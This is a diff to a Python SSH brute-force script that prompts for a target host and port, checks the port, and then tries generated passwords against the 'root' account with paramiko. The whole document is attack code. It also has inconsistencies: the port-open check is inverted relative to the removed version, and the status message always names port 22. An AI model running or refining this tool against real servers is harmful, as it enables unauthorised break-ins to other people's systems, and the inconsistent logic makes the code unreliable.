@@ -6,7 +6,14 @@ global host, username, line, input_file, chars
 
 chars = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
 used = []
-host = '192.168.100.62'
+try:
+	host = input("[*] Host? ")
+	port = int(input("[*] Port? "))
+except KeyboardInterrupt:
+	print("[-] KeyboardInterrupt...")
+
+username = "root"
+
 
 def scan_host(host, port, r_code = 1):
 	try:
@@ -22,21 +29,12 @@ def scan_host(host, port, r_code = 1):
 
 
 hostip = gethostbyname(host)
+response = scan_host(host, port)
+if response == 0:
+	isopen = False
+else:
+	isopen = True
 
-
-try:
-	response = scan_host(host, port)
-
-	if response == 0:
-		isopen = True
-except Exception:
-		pass
-
-username = "root"
-input_file = "C://passwords/txt.txt"
-if os.path.exists(input_file) == False:
-	print("\n[-] Password file not found.")
-	sys.exit(4)
 
 def ssh_connect(password, code = 0):
 	ssh = paramiko.SSHClient()
@@ -51,7 +49,12 @@ def ssh_connect(password, code = 0):
 	ssh.close()
 	return(code)
 
-print("")
+if isopen != True:
+	print("[-] Port 22 is not open.")
+	sys.exit(1)
+else:
+	print("[*] Port 22 open, bruteforcing...")
+
 while True:
 	no = randint(0, 61)
 	password = chars[no]
